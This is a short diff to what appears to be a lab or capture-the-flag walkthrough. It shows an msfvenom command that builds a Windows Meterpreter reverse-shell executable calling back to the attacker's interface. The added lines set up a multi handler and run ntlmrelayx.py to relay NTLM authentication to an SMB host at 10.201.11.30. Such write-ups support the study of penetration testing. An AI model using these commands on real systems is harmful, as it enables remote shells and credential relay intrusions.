@@ -84,3 +84,11 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=53 -f exe > met
 ```
 
 
+Setup up the multi handler and run it 
+
+
+After than run the NTLMrelayx.py
+
+```
+sudo ntlmrelayx.py -t smb://10.201.11.30 -smb2support -socks
+```
